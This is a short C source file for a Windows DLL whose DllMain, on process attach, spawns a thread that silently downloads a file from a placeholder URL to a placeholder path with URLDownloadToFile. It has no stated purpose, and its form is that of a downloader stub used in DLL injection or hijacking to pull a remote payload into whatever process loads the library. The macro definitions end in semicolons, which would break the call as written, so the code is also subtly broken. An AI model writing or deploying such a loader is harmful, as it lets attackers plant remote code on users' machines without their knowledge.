#include <Windows.h>

#define URL ("<URL>");
#define URI ("<URI>");

DWORD WINAPI Thread(LPVOID lParam)
{
    URLDownloadToFile(NULL, URL, URI, 0, NULL);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hInstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    HANDLE hThread = NULL;

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        hThread = CreateThread(NULL, 0, Thread, NULL, 0, NULL);
        CloseHandle(hThread);
        break;
    }

    return TRUE;
}
